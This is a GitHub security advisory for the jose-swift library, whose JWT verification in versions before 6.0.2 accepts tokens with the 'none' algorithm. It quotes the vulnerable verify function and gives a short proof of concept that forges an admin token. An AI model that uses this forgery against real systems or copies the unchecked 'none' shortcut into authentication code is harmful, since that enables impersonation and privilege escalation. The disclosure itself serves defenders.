# [H] jose-swift has JWT Signature Verification Bypass via None Algorithm

## Summary
Severity: High
Advisory: GHSA-88q6-jcjg-hvmw
CWE: CWE-327
Ecosystem: SwiftURL
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-01-09
Source: https://github.com/advisories/GHSA-88q6-jcjg-hvmw
Type: github-advisory

## Affected
- SwiftURL: `github.com/beatt83/jose-swift` — affected >=0 <6.0.2

## Details
### Summary
An authentication bypass vulnerability allows any unauthenticated attacker to forge arbitrary JWT tokens by setting "alg": "none" in the token header. The library's verification functions immediately return `true` for such tokens without performing any cryptographic verification, enabling complete impersonation of any user and privilege escalation.

### Details
  The vulnerability exists in Sources/JSONWebSignature/JWS+Verify.swift at lines 34-37:

```
  public func verify<Key>(key: Key?) throws -> Bool {
      guard SigningAlgorithm.none != protectedHeader.algorithm else {
          return true  // <-- Vulnerability: returns true without verification
      }
```
  When the JWT header contains "alg": "none", the verify() method returns true immediately without:
  1. Checking if the signature is empty or present
  2. Validating the token against any key
  3. Requiring explicit opt-in from the caller
  

 The SigningAlgorithm enum in Sources/JSONWebAlgorithms/Signatures/SigningAlgorithm.swift:72 explicitly includes case none = "none" as a valid algorithm.

  All verification methods are affected:
  - JWS.verify(key:) - Instance method
  - JWS.verify(jwsString:payload:key:) - Static method
  - JWT.verify(jwtString:senderKey:) - High-level API

### PoC

  1. Create a forged JWT with modified claims:
  // Forged header with alg:none
  let header = #"{"alg":"none","typ":"JWT"}"#

  // Attacker's payload with escalated privileges
  let payload = #"{"sub":"user123","admin":true}"#

  // Base64URL encode and concatenate with empty signature
  let forgedToken = base64url(header) + "." + base64url(payload) + "."
  // Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMTIzIiwiYWRtaW4iOnRydWV9.

  2. Verify the forged token passes verification:
  let jws = try JWS(jwsString: forgedToken)
  let isValid = try jws.verify(key: legitimateSecretKey)  // Returns TRUE


### Impact

  This is an authentication bypass vulnerability.   Who is impacted: Any application using jose-swift for JWT verification is vulnerable. An attacker can:

  - Forge identity: Create tokens claiming to be any user
  - Escalate privileges: Add admin/superuser claims to gain unauthorized access
  - Bypass authentication entirely: Access protected resources without valid credentials
  - Modify any claim: Change expiration, audience, issuer, or any custom claims

  The attack requires no knowledge of the signing key and works against all signature algorithms (HS256, RS256, ES256, etc.) since the attacker simply bypasses signature verification entirely.

### Credits
Reported by Louis Nyffenegger - https://pentesterlab.com/

## References
- https://github.com/beatt83/jose-swift/security/advisories/GHSA-88q6-jcjg-hvmw
- https://github.com/beatt83/jose-swift/pull/62
- https://github.com/beatt83/jose-swift/commit/13e5ae6f23ef1487b0dad72540eff414272bd7ca
- https://github.com/beatt83/jose-swift
- https://github.com/beatt83/jose-swift/releases/tag/6.0.2
